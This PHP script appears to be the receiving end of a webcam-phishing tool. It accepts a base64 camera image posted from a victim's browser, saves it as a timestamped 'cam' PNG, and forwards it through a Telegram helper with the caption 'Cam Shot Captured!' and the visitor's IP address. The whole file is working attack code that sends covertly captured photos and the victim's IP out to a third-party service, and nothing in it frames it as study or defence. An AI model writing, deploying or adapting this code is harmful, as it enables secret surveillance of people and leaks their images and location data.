<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

include 'telegram_utils.php';
sendTelegramPhoto('cam'.$date.'.png', "<b>Cam Shot Captured!</b>\nIP: " . $_SERVER['REMOTE_ADDR']);


exit();
?>

